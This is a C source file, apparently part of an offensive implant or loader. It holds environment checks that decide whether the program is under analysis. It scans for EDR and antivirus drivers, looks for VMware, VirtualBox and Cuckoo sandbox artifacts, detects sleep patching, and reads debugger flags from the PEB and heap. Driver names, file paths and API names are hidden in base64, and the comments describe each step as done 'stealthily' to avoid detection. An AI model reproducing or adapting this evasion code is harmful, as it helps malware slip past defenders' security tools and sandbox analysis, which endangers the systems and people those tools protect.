#include "detector.h"
#include "evasion.h"
#include <winternl.h>
#include <stdio.h>
#include <time.h>
#include <shlwapi.h>

// EDR Detection: Scan system driver directory for known EDR drivers
bool DetS()
{
    const char *edrDriversEncoded[] = {
        "YXRyc2Rmdy5zeXM=", "YXZndHB4ODYuc3lz", "YXZndHB4NjQuc3lz", "bmFzd1NQLnN5cw==",
        "ZWRyc2Vuc29yLnN5cw==", "Q2FyYm9uQmxhY2tLLnN5cw==", "cGFyaXR5LnN5cw==", "Y2JrNy5zeXM=",
        "Y2JzdHJlYW0uc3lz", "Y3NhY2VudHIuc3lz", "Y3NhZW5oLnN5cw==", "Y3NhcmVnLnN5cw==",
        "Y3Nhc2NyLnN5cw==", "Y3NhYXYuc3lz", "Y3NhYW0uc3lz", "cnZzYXZkLnN5cw==",
        "Y2ZybWQuc3lz", "Y21kY2Nhdi5zeXM=", "Y21kZ3VhcmQuc3lz", "Q21kTW5FZnMuc3lz",
        "TXlETE1QRi5zeXM=", "aW0uc3lz", "Y3NhZ2VudC5zeXM=", "Q3liS2VybmVsVHJhY2tlci5zeXM=",
        "Q1JFeGVjUHJldi5zeXM=", "Q3lPcHRpY3Muc3lz", "Q3lQcm90ZWN0RHJ2MzIuc3lz",
        "Q3lQcm90ZWN0RHJ2NjQuc3lz", "Z3JvdW5kbGluZzMyLnN5cw==", "Z3JvdW5kbGluZzY0LnN5cw==",
        "ZXNlbnNvci5zeXM=", "ZWRldm1vbi5zeXM=", "ZWhkcnYuc3lz", "RmVLZXJuLnN5cw==",
        "V0ZQX01SVC5zeXM=", "eGZzZ2suc3lz", "ZnNhdHAuc3lz", "ZnNocy5zeXM=",
        "SGV4aXNGU01vbml0b3Iuc3lz", "a2xpZmtzLnN5cw==", "a2xpZmFhLnN5cw==",
        "S2xpZnNtLnN5cw==", "bWJhbXdhdGNob2cuc3lz", "bWZlYXNrbS5zeXM=",
        "bWZlbmNmaWx0ZXIuc3lz", "UFNJTlBST0Muc3lz", "UFNJTkZJTEUuc3lz",
        "YW1mc20uc3lz", "YW1tODY2MC5zeXM=", "YW1tNjQ2MC5zeXM=", "ZWF3LnN5cw==",
        "U0FGRS5zeXM=", "U2VudGluZWxNb25pdG9yLnN5cw==", "U0FWT25BY2Nlc3Muc3lz",
        "c2F2b25hY2Nlc3Muc3lz", "c2xkLnN5cw==", "cGdwd2RlZnMuc3lz",
        "R0VQcm90ZWN0aW9uLnN5cw==", "ZGlmbHQuc3lz", "c3lzTW9uLnN5cw==",
        "c3NyZnNmLnN5cw==", "ZW14ZHJ2Mi5zeXM=", "cmVnaG9vay5zeXM=",
        "c3BiYmNkc3Iuc3lz", "YmhkcnZ4ODYuc3lz", "YmhkcnZ4NjQuc3lz",
        "U0lTSVBTRmlsZUZpbHRlci5zeXM=", "c3ltZXZlbnQuc3lz",
        "dnhmc3JlcC5zeXM=", "VmlydEZpbGUuc3lz", "U3ltQUZSLnN5cw==",
        "c3ltZWZhc2kuc3lz", "c3ltZWZhLnN5cw==", "c3ltZWZhNjQuc3lz",
        "U3ltSHNtLnN5cw==", "ZXZtZi5zeXM=", "R0VGQ01QLnN5cw==",
        "VkZTRW5jLnN5cw==", "cGdwZnMuc3lz", "ZmVuY3J5LnN5cw==",
        "c3ltcmcuc3lz", "bmRnZG1rLnN5cw==", "c3NmbW9ubS5zeXM=",
        "ZGxwd3BkZmx0ci5zeXM="};

    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA("C:\\Windows\\System32\\drivers\\*.sys", &findFileData);

    if (hFind == INVALID_HANDLE_VALUE)
        return false;

    do
    {
        for (int i = 0; i < sizeof(edrDriversEncoded) / sizeof(edrDriversEncoded[0]); i++)
        {
            char *decodedDriver = Bsfd(edrDriversEncoded[i]); // Decode Path
            if (!decodedDriver)
                continue;
            if (StrStrIA(findFileData.cFileName, decodedDriver))
            {
                myDebug(DEBUG_INFO, "Detected EDR: %s", decodedDriver);
                return true;
            }
        }
    } while (FindNextFileA(hFind, &findFileData));

    FindClose(hFind);
    return false;
}

// Sleep Patching Detection: Checks if Sleep(10000) completes normally
bool DetSl()
{
    LARGE_INTEGER startTime, endTime, frequency;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&startTime);

    Sleep(10000); // Expected to take ~10,000 ms

    QueryPerformanceCounter(&endTime);
    double elapsedMs = ((double)(endTime.QuadPart - startTime.QuadPart) / frequency.QuadPart) * 1000.0;

    if (elapsedMs < 9000.0 || elapsedMs > 11000.0)
    {
        myDebug(DEBUG_INFO, "Sleep timing anomaly detected: %f ms", elapsedMs);
        return true;
    }
    return false;
}

// Sandbox Detection files using Base64 Encoding
bool DetSBF()
{

    pMod pPathFileExistsA = GetMod("shlwapi.dll", "PathFileExistsA");
    if (!pPathFileExistsA)
        return false;

    // Base64 Encoded Paths
    const char *encodedPaths[] = {
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXFZtbW91c2Uuc3lz",     // Vmmouse.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtM2RnbC5kbGw=",     // vm3dgl.dll
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtZHVtLmRsbA==",     // vmdum.dll
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtM2R2ZXIuZGxs",     // vm3dver.dll
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtdHJheS5kbGw=",     // vmtray.dll
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtY2kuc3lz",         // vmci.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtdXNibW91c2Uuc3lz", // vmusbmouse.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZteF9zdmdhLnN5cw==", // vmx_svga.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZteG5ldC5zeXM=",     // vmxnet.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94R3Vlc3Quc3lz",             // VBoxGuest.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94U0Yuc3lz",                 // VBoxSF.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94VmlkZW8uc3lz",             // VBoxVideo.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94U2VydmljZS5leGU=",         // VBoxService.exe
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94VHJheS5leGU=",             // VBoxTray.exe
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94Q29udHJvbC5leGU="          // VBoxControl.exe
    };

    int numPaths = sizeof(encodedPaths) / sizeof(encodedPaths[0]);

    for (int i = 0; i < numPaths; i++)
    {
        char *decodedPath = Bsfd(encodedPaths[i]); // Decode Path
        if (!decodedPath)
            continue;

        if (pPathFileExistsA(decodedPath))
        {
            myDebug(DEBUG_INFO, "Sandbox file detected!");
            free(decodedPath);
            return true;
        }

        free(decodedPath);
    }
    return false;
}

// Filename Hash Detection: Checks if file name matches hash (common in sandboxes)
bool DetF()
{
    // Get a pointer to GetProcAddress
    pModC pGetProcAddress = (pModC)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("R2V0UHJvY0FkZHJlc3M="));
    // Get a pointer to GetModuleHandleA
    pMod pGetModuleHandleA = (pMod)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("R2V0TW9kdWxlSGFuZGxlQQ=="));

    // Resolve Kernel32 base
    HMODULE hKernel32 = (HMODULE)pGetModuleHandleA(Bsfd("a2VybmVsMzIuZGxs"));

    // Resolve API functions dynamically
    FARPROC pGetModuleFileNameA = pGetProcAddress(hKernel32, Bsfd("R2V0TW9kdWxlRmlsZU5hbWVB")); // GetModuleFileNameA
    pCreateFileA_t pCreateFileA = (pCreateFileA_t)pGetProcAddress(hKernel32, Bsfd("Q3JlYXRlRmlsZUE=")); // CreateFileA
    pGetFileSize_t pGetFileSize = (pGetFileSize_t)pGetProcAddress(hKernel32, Bsfd("R2V0RmlsZVNpemU=")); // GetFileSize
    pReadFile_t pReadFile = (pReadFile_t)pGetProcAddress(hKernel32, Bsfd("UmVhZEZpbGU=")); // ReadFile
    pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(Bsfd("a2VybmVsMzIuZGxs"), "CloseHandle");

    // Ensure all function pointers are valid
    if (!pGetModuleFileNameA || !pCreateFileA || !pGetFileSize || !pReadFile  || !pCloseHandle)
        return false;

    // Retrieve executable path stealthily
    char exePath[MAX_PATH] = {0};
    pGetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Open file without direct API calls
    HANDLE hFile = pCreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return false;

    // Get file size stealthily
    DWORD fileSize = pGetFileSize(hFile, NULL);

    // Allocate buffer on stack instead of HeapAlloc
    BYTE buffer[4096]; // Small stack buffer to avoid heap detection
    DWORD bytesRead;

    // Read file content stealthily
    pReadFile(hFile, buffer, min(fileSize, sizeof(buffer)), &bytesRead, NULL);

    // Close file handle
    pCloseHandle(hFile);

    // Implement custom XOR-based hashing instead of using Crypt APIs
    BYTE hash[16] = {0};
    for (DWORD i = 0; i < bytesRead; i++)
    {
        hash[i % 16] ^= buffer[i];
    }

    // Convert hash to a string
    char hashStr[33] = {0};
    for (int i = 0; i < 16; i++)
    {
        sprintf(&hashStr[i * 2], "%02X", hash[i]);
    }

    // Extract filename manually (avoid PathFindFileNameA)
    char *fileName = exePath;
    for (char *p = exePath; *p; p++)
    {
        if (*p == '\\')
            fileName = p + 1;
    }

    // Remove ".exe" manually
    char *ext = strrchr(fileName, '.');
    if (ext)
        *ext = '\0';

    // Stealthy string comparison using bitwise operations (avoid _stricmp)
    int match = 1;
    for (int i = 0; fileName[i] && hashStr[i]; i++)
    {
        if ((fileName[i] ^ hashStr[i]) != 0)
        {
            match = 0;
            break;
        }
    }
    if (match)
    {
        return true;
    }

    return false;
}

// Detect SandBox DLLs
bool DetSBD()
{
    // Base64 Encoded DLLs (obfuscated)
    const char *encoded_realDLLs[] = {
        "a2VybmVsMzIuZGxs",             // kernel32.dll
        "bmV0d29ya2V4cGxvcmVyLmRsbA==", // networkexplorer.dll
        "TmxzRGF0YTAwMDAuZGxs"          // NlsData0000.dll
    };

    const char *encoded_sandboxDLLs[] = {
        "Y21kdnJ0LjMyLmRsbA==", // cmdvrt.32.dll
        "Y3Vja29vbW9uLmRsbA==", // cuckoomon.dll
        "Y21kdnJ0LjY0LmRsbA==", // cmdvrt.64.dll
        "cHN0b3JlYy5kbGw=",     // pstorec.dll
        "YXZnaG9va3guZGxs",     // avghookx.dll
        "YXZnaG9va2EuZGxs",     // avghooka.dll
        "c254aGsuc3lz",         // snxhk.dll
        "YXBpX2xvZy5kbGw=",     // api_log.dll
        "ZGlyX3dhdGNoLmRsbA==", // dir_watch.dll
        "d3Blc3B5LmRsbA=="      // wpespy.dll
    };

    // Get a pointer to GetModuleHandleA
    pMod pGetModuleHandleA = (pMod)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("R2V0TW9kdWxlSGFuZGxlQQ==")); 
    // Get a pointer to LoadLibraryA
    pMod pLoadLibraryA = (pMod)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("TG9hZExpYnJhcnlB"));

    for (int i = 0; i < sizeof(encoded_realDLLs) / sizeof(encoded_realDLLs[0]); i++)
    {
        char *decodedPath = Bsfd(encoded_realDLLs[i]);
        HMODULE lib_inst = (HMODULE)pLoadLibraryA(decodedPath);
        if (lib_inst == NULL)
        {
            myDebug(DEBUG_INFO, "Checks : %s", decodedPath);
            free(decodedPath);
            return true;
        }
        free(decodedPath);
        FreeLibrary(lib_inst);
    }

    for (int i = 0; i < sizeof(encoded_sandboxDLLs) / sizeof(encoded_sandboxDLLs[0]); i++)
    {
        char *decodedPath = Bsfd(encoded_sandboxDLLs[i]);
        HMODULE lib_inst = (HMODULE)pGetModuleHandleA(decodedPath);
        if (lib_inst != NULL)
        {
            printf("Checks : %s", decodedPath);
            free(decodedPath);
            return true;
        }
        free(decodedPath);
    }

    return false;
}

// Detect if NtGlobalFlag is present in PEB
bool DetFPEB()
{
// Get Process Environment Block (PEB)
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
    // NtGlobalFlag is at offset 0xBC in 64-bit PEB
    DWORD NtGlobalFlag = *(DWORD *)((BYTE *)peb + 0xBC);
#else // _WIN32
    PEB *peb = (PEB *)__readfsdword(0x30);
    // NtGlobalFlag is at offset 0x68 in 32-bit PEB
    DWORD NtGlobalFlag = *(DWORD *)((BYTE *)peb + 0x68);
#endif

    // Check NtGlobalFlag
    return NtGlobalFlag & (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS);
}

// Detect debugger flags in HEAP
bool DetFH()
{
// Get Process Environment Block (PEB)
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
    PVOID pHeapBase = (PVOID)(*(PDWORD_PTR)((PBYTE)peb + 0x30));
    DWORD dwHeapFlagsOffset = 0x70;      // 0x14 if Windows version inferior to Vista but who use old computers ? ;)
    DWORD dwHeapForceFlagsOffset = 0x74; // 0x18 if Windows version inferior to Vista but who use old computers ? ;)
#else                                    // _WIN32
    PEB *peb = (PEB *)__readfsdword(0x30);
    // Assuming no WOW64 processes for simplicity
    PVOID pHeapBase = (PVOID)(*(PDWORD_PTR)((PBYTE)peb + 0x18));
    DWORD dwHeapFlagsOffset = 0x40;      // 0x0C if Windows version inferior to Vista but who use old computers ? ;)
    DWORD dwHeapForceFlagsOffset = 0x44; // 0x10 if Windows version inferior to Vista but who use old computers ? ;)
#endif                                   // _WIN64

    DWORD dwHeapFlags = *(DWORD *)((PBYTE)pHeapBase + dwHeapFlagsOffset);
    DWORD dwHeapForceFlags = *(DWORD *)((PBYTE)pHeapBase + dwHeapForceFlagsOffset);

    // Check heap flags
    return (dwHeapFlags & ~HEAP_GROWABLE) || (dwHeapForceFlags != 0);
}

// Main Sandbox Detection Function
bool PerfomChecksEnv()
{
    myDebug(DEBUG_INFO, "Checking for NtGlobalFlag...");
    if (DetFPEB())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for Heap Flags...");
    if (DetFH())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for filename hash matching...");
    if (DetF())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for sandbox files...");
    if (DetSBF())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for EDRs...");
    if (DetS())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for sleep patching...");
    if (DetSl())
        return true; // avoiding further checks

    myDebug(DEBUG_INFO, "Checking for dll...");
    if (DetSBD())
        return true; // avoiding further checks

    return false;
}
